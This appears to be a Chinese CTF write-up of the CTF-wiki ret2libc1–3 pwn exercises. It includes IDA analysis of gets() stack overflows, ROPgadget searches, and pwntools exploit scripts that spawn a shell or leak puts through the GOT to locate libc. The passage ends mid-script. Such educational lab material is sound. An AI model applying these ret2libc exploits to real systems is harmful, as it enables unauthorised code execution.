ret2libc1: ELF <span class="token number">32</span>-bit LSB executable, Intel <span class="token number">80386</span>, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="token keyword">for</span> GNU/Linux <span class="token number">2.6</span>.24, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped
<span class="token punctuation">[</span>root@ningan ret2libc1<span class="token punctuation">]</span><span class="token comment">#</span>
<span class="token punctuation">[</span>root@ningan ret2libc1<span class="token punctuation">]</span><span class="token comment"># checksec ret2libc1</span>
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Could not populate PLT: future feature annotations is not defined <span class="token punctuation">(</span>unicorn.py, line <span class="token number">2</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/root/ctf/ctfwiki/ret2libc1/ret2libc1'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>

</code></pre> 
<h3><a id="ida_442"></a>ida分析</h3> 
<pre><code class="prism language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-64h] BYREF</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"RET2LIBC &gt;_&lt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>查找system函数的地址</p> 
<pre><code>.plt:08048460                               ; int system(const char *command)
</code></pre> 
<p><img src="https://images2.imgbox.com/4b/d0/dSR2qxJ7_o.png" alt="image.png"></p> 
<p>查找/bin/sh字符串的地址</p> 
<pre><code>.rodata:08048720	00000008	C	/bin/sh
</code></pre> 
<p><img src="https://images2.imgbox.com/cb/d9/prCtEZkP_o.png" alt="image.png"></p> 
<h3><a id="_473"></a>解题思路</h3> 
<p>这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址</p> 
<p>如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’4位垃圾数据’ 作为虚假的地址，其后参数对应的参数内容。</p> 
<pre><code>默认栈帧
                                           +-----------------+
                                           |     retaddr     |
                                           +-----------------+
                                           |     saved ebp   |
                                    ebp---&gt;+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                     v4---&gt;+-----------------+

修改后栈帧

                                           +-----------------+                                           
                                           |    binsh_addr   |
                                           +-----------------+                                        
                                           |    4位垃圾数据   |
                                           +-----------------+
                                           |    (retaddr)    |
                                           | system_plt_addr |
                                           +-----------------+
                                           |   (saved ebp)   |
                                           |      BBBBB      |
                                    ebp---&gt;+-----------------+
                                           |                 |
                                           |                 |
                                           |   AAA...AAAA    |
                                           |     108位       |
                                           |                 |
                                           |                 |
                                     v4---&gt;+-----------------+
</code></pre> 
<h3><a id="exp_517"></a>exp</h3> 
<pre><code class="prism language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc1'</span><span class="token punctuation">)</span>

binsh_addr <span class="token operator">=</span> <span class="token number">0x8048720</span>
system_plt <span class="token operator">=</span> <span class="token number">0x08048460</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">,</span> system_plt<span class="token punctuation">,</span> <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">"""
[root@ningan ret2libc1]# python exp.py
[+] Starting local process './ret2libc1': pid 738
[*] Switching to interactive mode
RET2LIBC &gt;_&lt;
$ ls
exp.py    ret2libc1

"""</span>
</code></pre> 
<h2><a id="ret2libc2_545"></a>ret2libc2</h2> 
<h3><a id="_547"></a>检查</h3> 
<pre><code class="prism language-bash"><span class="token punctuation">[</span>root@ningan ret2libc2<span class="token punctuation">]</span><span class="token comment"># file ret2libc2</span>
ret2libc2: ELF <span class="token number">32</span>-bit LSB executable, Intel <span class="token number">80386</span>, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="token keyword">for</span> GNU/Linux <span class="token number">2.6</span>.24, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped
<span class="token punctuation">[</span>root@ningan ret2libc2<span class="token punctuation">]</span><span class="token comment">#</span>
<span class="token punctuation">[</span>root@ningan ret2libc2<span class="token punctuation">]</span><span class="token comment"># checksec ret2libc2</span>
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Could not populate PLT: future feature annotations is not defined <span class="token punctuation">(</span>unicorn.py, line <span class="token number">2</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/root/ctf/ctfwiki/ret2libc2/ret2libc2'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>

</code></pre> 
<h3><a id="ida_565"></a>ida分析</h3> 
<pre><code class="prism language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-64h] BYREF</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Something surprise here, but I don't think it will work."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What do you think ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/c2/9f/zHrqmQOC_o.png" alt="image.png"></p> 
<p>可以看到，有system的plt函数，如上图；但是没有/bin/sh字符串，如下图</p> 
<p><img src="https://images2.imgbox.com/28/8e/9a1KCbG4_o.png" alt="image.png"></p> 
<h3><a id="ROPgadget_590"></a>ROPgadget分析</h3> 
<p><img src="https://images2.imgbox.com/d5/40/Q1ksFmkm_o.png" alt="image.png"></p> 
<p>这个工具也看到没有/bin/sh字符串</p> 
<p><img src="https://images2.imgbox.com/4d/ac/5H9ynYrV_o.png" alt="image.png"></p> 
<h3><a id="bss_604"></a>查看bss是否可以写入</h3> 
<h4><a id="ida_606"></a>ida分析</h4> 
<p>bss段的大概位置为：0804A040-&gt;0804A040，并且0x0804A040处有一个可以写入的地方(buf2变量)</p> 
<p><img src="https://images2.imgbox.com/a4/67/7SAGO9U6_o.png" alt="image.png"></p> 
<p><img src="https://images2.imgbox.com/87/e5/rjOmTJfU_o.png" alt="image.png"></p> 
<p>get函数的地址为：0x08048460</p> 
<h4><a id="gdb_615"></a>gdb分析</h4> 
<pre><code>gdb   ret2libc2
b main
r
vmmap
</code></pre> 
<p><img src="https://images2.imgbox.com/54/20/s45H1zKc_o.png" alt="image.png"><br> 可以看到，bss段是可写的</p> 
<h4><a id="ROPgadget_629"></a>ROPgadget分析</h4> 
<p><img src="https://images2.imgbox.com/29/84/dSfsXMPS_o.png" alt="image.png"></p> 
<pre><code class="prism language-bash"><span class="token punctuation">[</span>root@ningan ret2libc2<span class="token punctuation">]</span><span class="token comment"># ROPgadget --binary ret2libc2  --only 'pop|ret' | grep 'eax'</span>
<span class="token punctuation">[</span>root@ningan ret2libc2<span class="token punctuation">]</span><span class="token comment">#</span>
<span class="token punctuation">[</span>root@ningan ret2libc2<span class="token punctuation">]</span><span class="token comment">#</span>
<span class="token punctuation">[</span>root@ningan ret2libc2<span class="token punctuation">]</span><span class="token comment"># ROPgadget --binary ret2libc2  --only 'pop|ret' | grep 'ebx'</span>
0x0804872c <span class="token builtin class-name">:</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret
0x0804843d <span class="token builtin class-name">:</span> pop ebx <span class="token punctuation">;</span> ret
<span class="token punctuation">[</span>root@ningan ret2libc2<span class="token punctuation">]</span><span class="token comment"># ROPgadget --binary ret2libc2  --only 'pop|ret' | grep 'ecx'</span>
<span class="token punctuation">[</span>root@ningan ret2libc2<span class="token punctuation">]</span><span class="token comment"># ROPgadget --binary ret2libc2  --only 'pop|ret' | grep 'edx'</span>

</code></pre> 
<p>拿到pop_ebx_ret的地址为：0x0804843d</p> 
<h3><a id="_647"></a>！！！重点思路！！！</h3> 
<p>代码中直接有system的plt地址，但是没有/bin/sh字符串<br> 这里就可以调用get函数来让我们输入/bin/sh 然后在让system返回到我们输入的地方<br> 哪里可以输入呢？查找bss段是否有可以输入的地方<br> 发现bss段有一个buf变量，而且bss段是可写的<br> 调用get函数写一个/bin/sh进去，把这个写进去的字符串当成system的函数来执行即可~</p> 
<h3><a id="exp_653"></a>exp</h3> 
<pre><code class="prism language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./ret2libc2'</span><span class="token punctuation">)</span>
get_add<span class="token operator">=</span><span class="token number">0x08048460</span>
sys_add<span class="token operator">=</span><span class="token number">0x08048490</span>
buf2_add<span class="token operator">=</span><span class="token number">0x0804A080</span>
payload<span class="token operator">=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">,</span>get_add<span class="token punctuation">,</span>sys_add<span class="token punctuation">,</span>buf2_add<span class="token punctuation">,</span>buf2_add<span class="token punctuation">]</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/22/00/GL1RF1Cp_o.png" alt="image.png"></p> 
<h3><a id="exp2_669"></a>exp2</h3> 
<pre><code class="prism language-python"><span class="token comment">##!/usr/bin/env python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc2'</span><span class="token punctuation">)</span>

gets_plt <span class="token operator">=</span> <span class="token number">0x08048460</span>
system_plt <span class="token operator">=</span> <span class="token number">0x08048490</span>
pop_ebx <span class="token operator">=</span> <span class="token number">0x0804843d</span>
buf2 <span class="token operator">=</span> <span class="token number">0x804a080</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>
    <span class="token punctuation">[</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">112</span><span class="token punctuation">,</span> gets_plt<span class="token punctuation">,</span> pop_ebx<span class="token punctuation">,</span> buf2<span class="token punctuation">,</span> system_plt<span class="token punctuation">,</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">,</span> buf2<span class="token punctuation">]</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/7b/33/D63na7wx_o.png" alt="image.png"></p> 
<p><img src="https://images2.imgbox.com/4f/8e/cagls2uX_o.png" alt="image.png"></p> 
<h3><a id="_694"></a>参考</h3> 
<p><a href="https://blog.csdn.net/m0_64180167/article/details/130263518?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-130263518-blog-122848031.235%5Ev38%5Epc_relevant_anti_vip_base&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-130263518-blog-122848031.235%5Ev38%5Epc_relevant_anti_vip_base&amp;utm_relevant_index=3"># CTFWIKI-PWN-ret2libc</a> 讲的非常详细</p> 
<h2><a id="ret2libc3_697"></a>ret2libc3</h2> 
<h3><a id="checksec_698"></a>checksec</h3> 
<pre><code class="prism language-bash"><span class="token punctuation">[</span>root@ningan ret2libc3<span class="token punctuation">]</span><span class="token comment"># file ret2libc3</span>
ret2libc3: ELF <span class="token number">32</span>-bit LSB executable, Intel <span class="token number">80386</span>, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="token keyword">for</span> GNU/Linux <span class="token number">2.6</span>.24, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped
<span class="token punctuation">[</span>root@ningan ret2libc3<span class="token punctuation">]</span><span class="token comment">#</span>
<span class="token punctuation">[</span>root@ningan ret2libc3<span class="token punctuation">]</span><span class="token comment"># checksec ret2libc3</span>
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Could not populate PLT: future feature annotations is not defined <span class="token punctuation">(</span>unicorn.py, line <span class="token number">2</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/root/ctf/ctfwiki/ret2libc3/ret2libc3'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
<span class="token punctuation">[</span>root@ningan ret2libc3<span class="token punctuation">]</span><span class="token comment"># ./ret2libc3</span>
No surprise anymore, system disappeard QQ.
Can you <span class="token function">find</span> it <span class="token operator">!</span>?1234
</code></pre> 
<p><img src="https://images2.imgbox.com/86/dc/XgABX1sj_o.png" alt="image.png"></p> 
<p>圈住的为自己输入的内容</p> 
<h3><a id="_722"></a>找漏洞函数</h3> 
<p>进入到ida中，查看main函数，发现gets函数有溢出</p> 
<pre><code class="prism language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-64h] BYREF</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No surprise anymore, system disappeard QQ."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can you find it !?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/da/2e/JqhE6qwW_o.png" alt="image.png"></p> 
<h3><a id="system_740"></a>找system函数-没找见</h3> 
<p>上图可以看到，没有system函数</p> 
<p>进到pwndbg中，也可以看到没有system函数<br> （此处可以以puts函数为对比，看到上图ida中puts函数的地址为0x08048460，看到下图pwndbg中puts函数的地址也为0x08048460）</p> 
<pre><code>pwndbg&gt; iinfo function puts
pwndbg&gt; iinfo function system
</code></pre> 
<p><img src="https://images2.imgbox.com/ea/43/K5dhLHha_o.png" alt="image.png"></p> 
<h3><a id="binsh_753"></a>找/bin/sh字符串-没找见</h3> 
<p>ida中找：<br> ida操作：shift+F12 找到字符串<br> 也没有/bin/sh字符串</p> 
<p><img src="https://images2.imgbox.com/fc/af/GWPzR6Ow_o.png" alt="image.png"></p> 
<p>ROPgadget操作：</p> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/ctfwiki/ret2libc3<span class="token punctuation">]</span>
└─<span class="token comment"># ROPgadget --binary ret2libc3 --string '/bin/sh'</span>
Strings information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/ctfwiki/ret2libc3<span class="token punctuation">]</span>
└─<span class="token comment"># ROPgadget --binary ret2libc3 --string 'sh'</span>
Strings information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x08048736 <span class="token builtin class-name">:</span> <span class="token function">sh</span>

</code></pre> 
<p><img src="https://images2.imgbox.com/b0/fa/7PdeUrQv_o.png" alt="image.png"></p> 
<p>上面看到，没有/bin/sh，有一个sh。<br> 那这个sh能否利用呢？<br> 看到sh的地址为：0x0x08048736，到ida中分析查看，找到了这个sh指的是no_shell-QQ中的sh，所以是不能利用的</p> 
<pre><code>.rodata:08048733                               ; const char s[]
.rodata:08048733 6E 6F 5F 73 68 65 6C 6C 5F 51+s db 'no_shell_QQ',0                    ; DATA XREF: secure+3D↑o
.rodata:0804873F 00                            align 10h
</code></pre> 
<p><img src="https://images2.imgbox.com/c9/f8/v77mNhvM_o.png" alt="image.png"></p> 
<h3><a id="_789"></a>解题思路</h3> 
<p>通过泄露libc的地址，来计算system的地址和/bin/sh的地址</p> 
<p>如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。**当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。**已经执行过的话就会在got表生存下来，有了真实的地址！</p> 
<p>(解法1) 可以泄露puts函数，puts函数已经执行过了。基本利用思路如下：</p> 
<ul><li>泄露puts函数地址</li><li>获取 libc 版本</li><li>获取 system 地址与 /bin/sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘/bin/sh’)</li></ul> 
<h3><a id="expputs_803"></a>exp：泄露puts函数的真实地址</h3> 
<pre><code class="prism language-python"><span class="token comment"># 导入 pwntools 库，这是一个用于二进制漏洞利用的强大工具库。</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># 导入 LibcSearcher，这是一个用于从函数地址中搜索libc版本和提取libc函数地址的工具。</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span> 

<span class="token comment"># 创建一个新的进程，执行名为 ret2libc3 的可执行文件。这将用于在本地系统上执行漏洞利用。</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2libc3"</span><span class="token punctuation">)</span>
<span class="token comment"># 将 ret2libc3 可执行文件加载到 elf 对象中，以便从中获取有关程序结构的信息，例如函数地址和GOT地址。</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ret2libc3"</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=== 通过泄露 puts 函数的地址 ==="</span><span class="token punctuation">)</span>
<span class="token comment"># 获取 puts 函数的 PLT（Procedure Linkage Table）地址和 GOT（Global Offset Table）地址。</span>
puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
<span class="token comment"># 获取程序的 _start 符号的地址，这通常是程序的入口点。</span>
start_addr<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_start'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_plt: "</span><span class="token punctuation">,</span> puts_plt<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(puts_plt): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_got: "</span><span class="token punctuation">,</span> puts_got<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(puts_got): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start_addr: "</span><span class="token punctuation">,</span> start_addr<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(start_addr): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 构建一个 payload，其中包括 112 个字节的填充（用于填充到返回地址之前），然后是 puts 函数的 PLT 地址、程序入口点地址和 puts 函数的 GOT 地址。这将在程序中触发漏洞。</span>
payload1 <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">,</span>puts_plt<span class="token punctuation">,</span>start_addr<span class="token punctuation">,</span>puts_got<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment"># payload1 = b'A'*108 + b'BBBB' + puts_plt + start + puts_got  # 报错：TypeError: can't concat int to bytes</span>
<span class="token comment"># payload1 = b'A'*108 + b'BBBB' + p32(puts_plt) + p32(start) + p32(puts_got) # 正确写法</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload1: "</span><span class="token punctuation">,</span> payload1<span class="token punctuation">)</span>
<span class="token comment"># 发送构建好的 payload1 到程序。</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'!?'</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>
<span class="token comment"># 接收从程序中泄露的 puts 函数的地址，并将其转换为整数。这将帮助确定libc的基址。</span>
<span class="token comment"># io.recv(4)接受程序返回的二进制 大小为4字节  u32()为保存为无符号的32位</span>
puts_addr_raw <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>puts_addr_raw<span class="token punctuation">)</span> 
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr_raw: "</span><span class="token punctuation">,</span> puts_addr_raw<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr: "</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex(puts_addr): "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=== 计算libc的基址，然后获取 system 函数地址和 /bin/sh 字符串地址 ==="</span><span class="token punctuation">)</span>
<span class="token comment"># 使用 LibcSearcher 工具，根据泄露的 puts 函数地址来搜索libc库并提取相关信息。</span>
libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>
<span class="token comment"># 计算libc的基址，这是通过从 puts 函数地址中减去 puts 在libc中的偏移得到的。</span>
base <span class="token operator">=</span> puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
<span class="token comment"># 计算 system 函数和 /bin/sh 字符串的地址，这将用于后续的漏洞利用。</span>
system_addr <span class="token operator">=</span> base<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
bin_addr<span class="token operator">=</span>base<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>
<span class="token comment"># 构建第二个 payload，其中包括 112 个字节的填充，然后是计算得到的 system 函数地址、随意的返回地址（1234），以及计算得到的 /bin/sh 字符串地址。</span>
